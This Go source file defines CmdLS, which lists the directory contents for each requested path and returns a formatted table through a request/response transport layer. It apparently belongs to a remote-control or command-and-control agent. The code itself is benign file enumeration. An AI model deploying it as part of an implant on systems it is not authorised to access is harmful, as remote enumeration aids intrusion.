package fs

import (
	"bytes"
	"fmt"
	"github.com/pygrum/Empress/transport"
	"os"
	"text/tabwriter"
	"time"
)

func CmdLS(req *transport.Request, response *transport.Response) {
	if len(req.Args) == 0 {
		req.Args = append(req.Args, []byte("."))
	}
	for _, path := range req.Args {
		entries, err := os.ReadDir(string(path))
		if err != nil {
			transport.ResponseWithError(response, err)
			return
		}
		var b bytes.Buffer
		w := tabwriter.NewWriter(&b, 1, 1, 2, ' ', 0)
		rowFmt := "%v\t%s\t%d\t%s\t%s\t\n"
		for _, d := range entries {
			var t = "file"
			if d.IsDir() {
				t = "dir"
			}
			info, err := d.Info()
			if err != nil {
				transport.ResponseWithError(response, err)
				_, _ = fmt.Fprintf(w, rowFmt,
					"--", t, 0, "--", d.Name())
				continue
			}
			// permissions, type (dir/file), size, last modified, name
			_, _ = fmt.Fprintf(w, rowFmt,
				info.Mode(), t, info.Size(), info.ModTime().Format(time.DateTime+" MST"), d.Name())
		}
		// must call to get an output
		_ = w.Flush()
		transport.AddResponse(response, transport.ResponseDetail{
			Status: transport.StatusSuccess,
			Dest:   transport.DestStdout,
			Data:   b.Bytes(),
		})
	}
	return
}
